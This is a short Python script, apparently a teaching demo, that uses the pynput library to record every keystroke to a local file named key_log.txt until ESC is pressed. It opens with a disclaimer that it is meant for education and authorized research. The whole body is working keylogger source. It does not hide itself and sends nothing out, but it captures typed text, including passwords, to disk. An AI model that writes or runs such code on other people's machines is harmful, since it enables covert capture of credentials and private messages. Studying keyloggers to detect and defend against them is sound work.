# Disclaimer: This script is intended strictly for educational purposes, 
# local testing, and authorized security research. 

from pynput import keyboard

# Define the path for the log file
LOG_FILE = "key_log.txt"

def on_press(key):
    try:
        print(key)
        log_entry = f"{key.char}"
    except AttributeError:
        if key == keyboard.Key.space:
            log_entry = " "
        elif key == keyboard.Key.enter:
            log_entry = "\n"
        else:
            log_entry = f" [{key.name}] "

    
    with open(LOG_FILE, "a",encoding = "utf-8") as file:
        file.write(log_entry + '\n')

def on_release(key):
    if key == keyboard.Key.esc:
        print("\nStopping listener...")
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger simulation started. Press ESC to stop. Monitoring...")
    listener.join()